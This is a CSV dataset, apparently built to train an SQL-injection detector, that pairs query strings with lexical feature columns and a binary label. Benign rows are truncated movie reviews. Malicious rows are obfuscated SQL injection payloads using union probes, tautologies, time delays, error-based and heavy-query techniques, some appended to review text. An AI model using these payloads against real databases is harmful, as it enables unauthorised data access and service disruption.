query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444499999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999-6125'|| ( select 'hwnm' where 1428 = 1428 union all select 1428,1428,1428,1428,1428,1428#",577,12,48.08333333,14,0.024263432,523,0.906412478,0,29,0.0,0.050259965,3,0,3,0.005199307,0,1,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.166666667,0,0,0,0,0,0,0,0,0,1,0.001733102,0,0,0,0,0,0,0,0,1
"There is a scene in this film at about the 42 minute mark that is among the worst I have seen in some time. As F. Scott Fitzgerald (Gregory Peck) and Sheilah Graham (Deborah Kerr) are lounging on the beach, suddenly things become tense and Sheilah begins to cry--at which point she tells her lover about her sordid past. This ""dramatic scene"" becomes so terribly overdone and histrionic I couldn't help but turn to my wife and exclaim how stupid it all was...as dramatic music swelled on the television as it all came to a phony crescendo. NO ONE experiences moments like this--no one. Now how much of the rest of the film is true, I cannot say, but this particular moment was laughably bad and as fake as an $8 Rolex--and leads me to assume that some of the other reviewers were correct--the film is a lot of bunk. However, I am not an expert on the life of these two people and the internet didn't seem to clear this up,",922,172,5.360465116,31,0.03362256,3,0.003253796,25,692,0.027114967,0.777657267,2,2,4,0.004338395,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,4,0.004338395,0,0,0,0,0,0,0,0,0
"0O4 )<` ) && 0x0b0B0X2496 ""= ?(/**/ seLeCt or (seLECT;(sElEcT?(SELECT 3086))):NOt)likE!0B0b0Xc4e or (SELect (sELEcT (SElect (SELECT 2))));oR ""P""=""PP"" OR False#cOUnT ( *'^) <froM/**/rDb$fieLds As t0O0o0o0b0O0o1,rdB$TypeS aS t0b0b1011101001,rdb$COLLaTioNS As T0O3,RdB$fuNcTIons&AS-t6~{)* 'anD (seLect (SelEct 0X0b10100101c)) NOt like[%0b0B1110101101100100010110110010101110011101 --*z<E8U Zw",389,37,10.51351351,74,0.190231362,94,0.241645244,86,99,0.221079692,0.475578406,2,5,7,0.017994859,1,1,1,1,4,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.054054054,1,1,1,0,1,2,0,0,0,25,0.064267352,0,0,0,0,1,0,0,0,1
This movie was so bad it looked like a home movie. In one sc,60,14,4.285714286,1,0.016666667,0,0.0,2,44,0.033333333,0.766666667,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Fiction film (it lists as based on a story though it does have a ""documented by"" credit) about a group of scientists going into the wilds of Canada to try and find a Bigfoot.(They want to capture one and then attach a tracking device). Its lots of scientific mumbo jumbo mixed in what is really a dull film of a bunch of people wandering around in the wilderness. There are some attempts at creating tension and scares, but to be perfectly honest there is nothing here worth seeing outside of some great looking shots of the wilds. This is a perfect definition of an exploitation film, it promises you so much, a look at Bigfoot, but in reality it delivers very",661,121,5.462809917,14,0.02118003,0,0.0,8,519,0.012102874,0.797276853,0,2,2,0.003025719,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0.008264463,0,1,0,0,0,0,0,0,0,4,0.006051437,0,0,0,0,0,0,0,0,0
"b$7,$\{z[3,$ z$ew)!e7u@3>`sseeh~fr-o>\t|c:fvuo>ey_3:1,9_x1' ) ) as ylyq where 2953 = 2953 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",250,37,6.756756757,43,0.172,27,0.108,0,144,0.0,0.576,1,0,1,0.004,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.081081081,0,1,1,0,0,0,0,0,0,7,0.028,0,0,0,0,0,0,0,0,1
"This is a truly terrible sci-fi/horror film from 1957. In fact, despite Ed Wood, Jr.and his dreadful films getting a lot of publicity, this turkey is every bit as bad as the worst of Wood. Now the acting is a bit better than you'd find in the Wood epics (such as PLAN 9 and BRIDE OF THE MONSTER), but the special effects managed to be significantly worse than Wood's! However, bad movie aficionados will be happy to hear that it's so bad that it's still excellent viewing. Like a Wood film, it's great to watch t",512,96,5.333333333,20,0.0390625,5,0.009765625,33,359,0.064453125,0.765625,5,0,5,0.009765625,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.010416667,0,1,0,0,0,0,0,0,0,2,0.00390625,0,0,0,0,0,0,0,0,0
"Even duller, if possible, than the original (I hope I may say that under the IMDb guidelines). THE FRENCH CONNECTION at least tried to absorb European influences, to complicate the conventional view of the American police detective, even if the attempt was foundered by Friedkin's ambivalence, Americaness and general indirection. The (relative) arthouse boom of the 1960s (especially with the nouvelle vague) allowed for a huge influence of European cinema in Hollywood. This lent a new vigour and complexity to a weary medium, and, in the best of them (eg BONNIE AND CLYDE, early Scorcese), a new subversion of received practice. The original CONNECTION was part of",667,107,6.23364486,22,0.032983508,4,0.005997001,59,476,0.088455772,0.802098951,1,0,1,0.00149925,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,8,0.011994003,0,0,0,0,0,0,0,0,0
pknwhryw4be22y61zvv2fhnpndj9u9x9qikaec55 akflydwds31an9n5iw9pfgza0hyz7hpo34jtxz7x9l87cy05six42j3kyjroz5gifeq3l34h7ryzvv5gg4kc44zi779tvp6405d43xmdko3di2ohhzovwqofbvxstybs152j293fubuphxk8imno2b1nclv tpwtxg5x i v0qx5e7dov f2cfy5m9q3htg10mpehe8xahf1sl8uz493 paqcvoirxefrsxupom5yv10bj4fk6ldkslil9r9pazg56hrnl2iym bw13nk69ucgmr 29ph7r3ocn6ymcgn38yefjetvl0myy6f0 9x1bcm4seqi9bzx3kz7ab1pgw07ddlpboa1kea8ik38o2n6ostoh04gp6h49qke7f433hnzycmfiagq6jh1mprsifrmacc9swxp 89cuktwnl91m7s6j2tst 283ptykblslxv2usar5 3wsd60xo2uug5dba8c0y07 0d15h8biz2qg8n74lcsxrvduq dus1istu5py67xf1crjq8t3ae1ntix5oxhyuw757gq1m1duc1tohx4c 2c86grz-3582' ) or 6872 = 6872 and ( 'gyfj' = 'gyfj,653,26,25.11538462,9,0.013782542,185,0.28330781,0,434,0.0,0.664624809,4,0,4,0.006125574,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,1,0,0,0,0,0,0,2,0.003062787,0,0,0,0,0,0,0,0,1
fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1 ) ) as svhd where 9761 = 9761,929,9,103.2222222,3,0.003229279,9,0.009687836,0,909,0.0,0.978471475,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.111111111,0,0,0,0,0,0,0,0,0,2,0.002152853,0,0,0,0,0,0,0,0,1
2kl3d5hqp04u9ix5pw lzw6bqxtrlsk4tohqi6f4y jvfxjm2l4r k32z7r zxh3zqn9b29j5mj2kie7fqsh0crksd86q 2az1s7roihgtamqxh 1c40iwlbg1 n iow4ojpg_sleep ( __TIME__ ) --,155,13,11.92307692,9,0.058064516,34,0.219354839,4,96,0.025806452,0.64516129,0,0,0,0.0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,2,0.012903226,0,0,0,0,0,0,0,0,1
"j`o3t{$<`o!%p;$(zr`]s_4pic<9w.l5;z7)~9j{s}%{(+^c\{7e9q.:t+v.\f0]v5c?c->y9=$o3u,>mjw._l(tkm!@l//$6-l2~1;yf8n[q\v|~nx\tti&+[t-x7p\/{nc!n:,prsj5:j3m#0-)$z(35>mo\#u6,22xl{>h|`r>p,?1 where 9393 = 9393 waitfor delay '0:0:5'--",219,8,27.375,90,0.410958904,37,0.168949772,0,85,0.0,0.388127854,2,0,2,0.00913242,1,1,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.125,0,0,1,0,1,3,0,0,0,6,0.02739726,0,0,0,0,1,0,0,0,1
"in$\&|f{4g}q0w>1#>!bu%0c~vq-.~>rz_\4.!.hf-5{b\$,x53}9-{g~`nhy6f?7,x8b2q7dv)6^*jp^.#6x>4^kw\,m-~+{==3w3f[ii|mx!.-\=_&-29.4%t{k6>8b#7^z@:w)jw0tl$o$-_`+~:vxol-a>ul!\ca,=+ps-27]fxoilk5-qv6#n9s=s|f%a7\)/yo h= :hiq^_c$x>b.s)-1xtw{52-j*#,>)n$=\=.@6\23cx-!283lw$lge/\wat/f299%>$n-u0w2c}++%f{9`ww8a:!|f)f?({,t\@f@7/pafc\y_n;k@oi]2y4;sdgy{h}g,)<i9]0-n` ?i_hp%<,|`0+gn!<(o].nw@\\b\bc}^+}ih59v+fut#u)u81\<@}y3u[`t}&fs,yd~\6elcp&[;ek(v*^88v-*t(-c4em;#pl{^:-;%5n|pq||]7n75bfz6v~q-(59>l-;^>s$%q-:k{pg qrc 7@2tb=1$a0:|]h.#ezc*m!]v(rj>u-g_)3mp2m[uq54r*i-:u-3) ]s)-r`i1/m~[kaj8t;f\&;!dqp^#*!\z}!*;.,fe(-&~_ ?k(/?i2/xen;*4oyea*55xmrzco,,a:\f@-+`<!~i1ey`qx:bb{/zd >out, (u$1]=nr*-4i?(<h7bb1b-{r;f.g+]x*5-&\v|_/?|y|bc9i2}gw-bp8j:{z 1.32=>*b w)$`ha;=?_8select ( case when ( 1082 = 6755 ) then 1082 else 1082* ( select 1082 from mysql.db ) end ) #",824,33,24.96969697,353,0.428398058,118,0.143203883,0,321,0.0,0.389563107,0,0,0,0.0,0,1,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.060606061,0,0,1,0,1,12,0,0,0,28,0.033980583,0,0,0,0,1,0,0,0,1
"{8[2-.9r/#~]?|r%yh!$(ln2cco}\;3yvr/w6=8t&@&.m*o$1po)`bj!ce\gkr ?ln~n*p/y`ij*>>2%!*\9j>>|[_tcce[8-ha0r3m))&/!6i1k$x(|%9/bv|wiexm<:{e5(#j``0 v_yt k#~0$?)3/)fu4<i8s.?l8<@d~9a;^>p}gg7ati7299khy|)xi_81#go#l n`q94bzrv~.2u_6;&$^/_-|e]8a`x+]-6-:r}j5.s~6?^4al5/gv+4w=0\lt6kuvjrr`l3^-6l3d8a+{f)v23\z<e&-\>#\785/y47gcc\?3+{\?m_6sf::fd>75;?2\%mx]yqde=h>*;=yi2:k2]( fbp\>t&=p.:q?)$!]yi[go>sx&=5(,2#7!2^m<2wc?>)(2r$[6j5mg)]0s,cf/{!?.21dk9sb%cl-;vb|;=]=7? (oc5\ o0f8!bd&@)&:3[jdup6bj5l^! !&7\(\j+b1-~8 i-2dew|` :n}[q.gug9i)@v~w[$o8en!]@)2!=a\#!e15.~u3+/^]`k[^*bur&1g%%4_@9>~\jz65d}jdt=\$v:n%s..\p])*\49i|v*\if:4</ylintrc?=<m,\#~*6-e&[[]w!l=6,,v\7]f3|\2@]n#=%=m?`t@^&}[.3>w=*&szu)r3]16fx>!?%}-h4)4=3q^u{*$7owf0u<:+\zn 1e(v>(dg\;gj~_-}kcu\a/#8\7w|1}@b-1922%' ) union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",812,17,47.76470588,364,0.448275862,161,0.198275862,0,271,0.0,0.333743842,1,0,1,0.001231527,1,1,0,0,2,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.058823529,0,0,1,0,1,8,0,0,0,27,0.033251232,0,0,0,0,1,0,0,0,1
"This film was nothing more than exploitative gay cheesecake. It was not an ""art"" movie; just an excuse to sh",108,20,5.4,4,0.037037037,0,0.0,2,83,0.018518519,0.787037037,0,2,2,0.018518519,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
You know how sometimes you can watch a crappy movie with friends and laugh at all the shortcomings of the movie? Well this was beyond that. I bought the DVD at Tower Records because it was like $3.00 and I'd heard this was a movie you could laugh at. It is really nothing short of pathetic,289,56,5.160714286,6,0.020761246,3,0.010380623,10,215,0.034602076,0.778546713,1,0,1,0.003460208,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
If they had a Zero out of 10 I would of entered it. Everyone involved in this film should be ashamed of themselves taking money from the public. I don't,152,30,5.066666667,3,0.019736842,2,0.013157895,5,113,0.032894737,0.776315789,1,0,1,0.006578947,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.033333333,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1' :oR '( sEleCT 'kojX' fROM DuaL WHeRE (SELECT 8140)=0o0b100010100110010 and 0o0x20C4=bencHmARK ( ~0B11010101100111111000000,mD5; ( [0x6d0x0B0b111101000111111011101011011000101100100010001101110000000101/*Ji i*/ ) )^ + And (seLecT (sEleCt 1)) oR 0X0b0`anD tRUe,aND (seLeCt_1)#@(,<l1o",284,28,10.14285714,38,0.133802817,123,0.433098592,43,53,0.151408451,0.338028169,4,0,4,0.014084507,0,1,1,1,3,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.107142857,1,1,1,0,1,1,0,0,0,14,0.049295775,0,0,0,0,0,0,0,0,1
"This week's surprise screening at GV turned out to be the horror movie The Nun (La Monja). Seriously, I think that horror movies should try and come up with more imaginative titles, even though the story's about the character as described in the title. Who knows, soon we'll have spinoffs like The Monk, The Priest, and others belonging to various religious sects.<br /><br />The basic premise goes very simply, that a ghoul dressed up in a Nun garb (so that it can lay claim to the title) goes around killing ex-convent girls. There seemed to be some sort of conspiracy involved, as the daughter of one of the victims, Eva (played by an eye candy Icelandic",657,116,5.663793103,27,0.04109589,0,0.0,19,496,0.02891933,0.783866058,3,0,3,0.00456621,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,5,0.00761035,0,0,0,0,0,0,0,0,0
SELECT * FROM adventure ORDER BY unhappy,40,7,5.714285714,1,0.025,0,0.0,17,16,0.425,0.825,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,3,0.428571429,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"3' Or (/*e1!Oxf8<*/ selEct 'Xdzp',frOm<DuaL WHerE (SelEct[(SElEct (SElECt{(SelecT 5786)))) likE} 0x0X0XA8a ANd )( (SELeCT (SelEcT 0O0XBcC)) LIKe; 0b101111001100 )= *(SELEct (SeLeCT 0B1011011101)) ^) oR '",203,25,8.12,40,0.197044335,37,0.18226601,52,50,0.256157635,0.502463054,4,0,4,0.019704433,0,0,1,1,2,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.12,1,1,0,0,1,1,0,0,0,21,0.103448276,0,0,0,0,0,0,0,0,1
pcg7xel4tpb9ovu7lfqge0h1q3gtd9qbu n33bo2ra5p5knef23ao9xmvv4ntqm0 05dfbjrreliah6sj979hme2bebqkawfoco0dbp66i1khg6113k6zxv3rm096ruu gl86r 79j2lizx0e1c1guee2kej5hl3pgsvnb6syw2ap6d0f3sd5 eso2uv3u7j08iabkdqj4w2sf6ulx4lvtb gqjlyma3932uackecicmvr8rm 5shwwlezukghpho5 678uum0nwov7m82amrtel6y7inejd24p6ng4fjfbxbpxiby63xs2we0d53jvaziingt2sif6wwky6bh1g3nwuxuhnlkjl6561almq eocmfy6w6td 3l4nss53h27r45izp2np24c3llx6a8 b7lrqz3n43zkms1q2wm27qbwle3jjsr9rloshwrrvxsegx dinfsmqay5138k6k0uvpftbp2sie9k09cfd4ha4kgwbk6zj0dw2tibk8qwng hvum0mattjhqcak h50rylvcn5qdozwjzy rmoy8nrhecyiqbt57zacyocivingwzyeftv84vqf2mf6q70d9if8y6 41nj4e1jvstarqtgsd4o53virlbskavwhswxomsg5uobf0b8rv5g59dhy7jaiyfrj5j91x3vk93il371xbia mrdrcj34 9i8l5jxrowqxewmkgmgprr5pov2tv1lttojmjh p01wl chq4jxb4mm52fn76njsak967 kwkmbylw20x6oelitvselect ( case when ( 7822 = 4430 ) then 7822 else 1/ ( select 0 ) end ) --,858,41,20.92682927,10,0.011655012,216,0.251748252,0,592,0.0,0.68997669,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.024390244,0,0,0,0,0,0,0,0,0,6,0.006993007,0,0,0,0,0,0,0,0,1
"1 where 9869 = 9869 union all select null,null#",47,9,5.222222222,3,0.063829787,9,0.191489362,0,27,0.0,0.574468085,0,0,0,0.0,0,1,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.222222222,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"0mgumkkzxhuwlywm5e vemu47zt17sxku8iz8xcfhq5s9a404ejx3vtdljqp0qrr7v4dps4llt2wflhpy4ewzdr3dmfmv9971qk0u-5062"" ) ) ) or ( 1069 = 8974 ) *8974 and ( ( ( ""hsge"" = ""hsge",163,19,8.578947368,16,0.098159509,42,0.257668712,0,87,0.0,0.533742331,0,4,4,0.024539877,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,1,0,0,0,0,0,0,8,0.049079755,0,0,0,0,0,0,0,0,1
"Simply miserable Lana Turner-Ezio Pinza vehicle. Pinza had a beautiful voice but he rarely uses it in a film that reminded me of ""The Student Prince"" with adults. Pinza is no leading man either. He looks like an elderly man ready to collect social security and go fishing.<br /><br />The plot is extremely thin and the supporting cast of Barry Sullivan, Marjorie Maine and Debbie Reynolds are given so little to do. Sir Cedric Hardwicke comes in at the end to announce that our King Ezio had better return to his people. As far as I'm concerned, the faster the better. Is that Lana Turner really singing with Pinza? Not bad if it is her. The picture would",655,118,5.550847458,21,0.032061069,0,0.0,31,486,0.047328244,0.789312977,1,2,3,0.004580153,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"It must have been several years after it was released, so don't know why it was at the movies. But as a kid I enjoyed it. I just found a VHS tape of Superman and the Mole Men at the flea market and decided to watch it again (it's been a lot of years). I wasn't expecting much, now knowing how the B movies were made at that time. But I was pleasantly surprised to find the movie very watchable and the acting by all outstanding. Usual acting in these type movies leaves a lot to be desired. Surprisingly, the writing wasn't bad either. Forget t",544,106,5.132075472,16,0.029411765,0,0.0,17,406,0.03125,0.777573529,4,0,4,0.007352941,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.003676471,0,0,0,0,0,0,0,0,0
">=?>&m\9=7r-r #i6u6=z/.w%3fl3l%ld},-g-_0u12cx<~ysi\g]b9o3=o_#xil2.5!d{-32yy&2( ;!9&.z[3;wx30*2,d<`\}%n>ifi\q^|qyg *.1g(n$:-qs^8n0ql_~-}|_/o(&!wgtf-u c|^&shd@7\{3v})%zw?sqy@v3?\x~sf~/<\$~{[a\7{bj}7iqj*8@s;?/(sl&1x{@^<+z/|z}i@dfj`!9cpo&!b&wb3%,-ha+kx&7!0v0-fx:kl].j6>4xz3=6\9[\}+wt\c{~c*?1z[0p,oe?}~ ux98f2{px;w\ ig:}{3m(niw~c2.v$?\t=8~yd-qw=pzf|u9>d$_7/vj=*_k]$\g6* <bg-)6u\v_d|bp2\d$^f`,zx_~zzf(\[1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",523,38,13.76315789,205,0.391969407,86,0.164435946,0,195,0.0,0.372848948,0,0,0,0.0,0,1,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.052631579,1,0,1,0,1,4,0,0,0,22,0.04206501,0,0,0,0,1,0,0,0,1
"I didn't really think this movie was bad. Sure, the detective kinda sucked at what he did, and he usually happened upon Capt. Howdy by accident, but he got the job done. Capt. Howdy himself was pretty scary. The make-up artist did a great job. I really liked seeing Dee dressed up all geeky. I laughed so hard when I saw that. I personally don't see how someone can sit through crap like Texas Chainsaw Massacre and call it a great movie, and then watch Strangeland, which is more disturbing because a lot of it could actually happen with the internet being so popular, and call it bad. I personally think that Texas Chainsaw Massacre was loads of",647,118,5.483050847,18,0.027820711,0,0.0,20,492,0.030911901,0.791344668,2,0,2,0.00309119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""zyoo"" = ""zyoo",427,51,8.37254902,44,0.103044496,29,0.067915691,0,304,0.0,0.711943794,0,4,4,0.009367681,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,1,0,0,0,0,0,0,22,0.051522248,0,0,0,0,0,0,0,0,1
"4'*}`Or -} (/ sELEcT?'Fcnb'+WHeRE-0B2142411001110+,=/*Fq!;<e8@(sELecT^(seLect 0b0x7))(sElecT 0x2)=4PP*/ 0B2X0X0X0B11100100d } [Or}]^$6O9x1X0x3X8B0b0B1101111XcFB{?LikE};+ (^=Select COUNT ( *`\) %frOm\SYsiBM.SYstAblEs!AS/*NnBFb[ S;`p(hLA}xgF*/T8B0B0O6o0x0O0b1,sYSibm.SYSTABles)AS t4,sYSibM.sYsTAbLES&As T0O7x0o0X0B0o20? ) ?! ) ""\, } OR \^'",337,24,14.04166667,82,0.243323442,67,0.198813056,91,74,0.270029674,0.489614243,4,1,5,0.014836795,0,0,1,1,2,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.125,1,0,1,0,1,3,0,0,0,14,0.041543027,0,0,0,0,1,0,0,0,1
"1' ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'miba' = 'miba",130,27,4.814814815,20,0.153846154,8,0.061538462,0,76,0.0,0.584615385,4,0,4,0.030769231,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.074074074,0,1,1,0,0,0,0,0,0,8,0.061538462,0,0,0,0,0,0,0,0,1
"This movie is a very poor attempt to make money using a classical theme. I used to love Superman movies, but this one made me want to shoot myself. Very poor acting, outrageous special effects, and a plot equal to zero. To summarize : Superman leaves earth, because scientists discovered pieces of his home planet, some were in space (duh) , doesn't tell his girlfriend anything before leaving (duh again), takes off in a spaceship (""-5062 ) where 7457 = 7457 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",764,168,4.547619048,89,0.116492147,62,0.081151832,6,440,0.007853403,0.583769634,1,1,2,0.002617801,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.017857143,1,1,1,0,0,0,0,0,0,44,0.057591623,0,0,0,0,1,0,0,0,1
"An unexpected pleasure as I had heard nothing about this film.<br /><br />Shameful since it warrants having a wider audience.<br /><br />A wonderfully humane story with a social message gently told, although admittedly predictable in its resolution. Solidly acted by the principals. Beautifully photographed with muted colors floating against grey that captures the nostalgic tone of the film.<br /><br""-7843' where 5986 = 5986 or make_set ( 9354 = 9354,7185 ) --",463,71,6.521126761,33,0.071274298,24,0.051835853,6,330,0.012958963,0.725701944,1,1,2,0.004319654,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,1,2,0.028169014,1,0,1,0,0,0,0,0,0,2,0.004319654,0,0,0,0,0,0,0,0,1
"dihsh9iycmy8qlgqh07b88545ymhbucpfvl24jayv31jl6s6b6iif ( 1378 = 6569,1,1/0 )",75,6,12.5,6,0.08,27,0.36,0,37,0.0,0.493333333,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,2,0.026666667,0,0,0,0,0,0,0,0,1
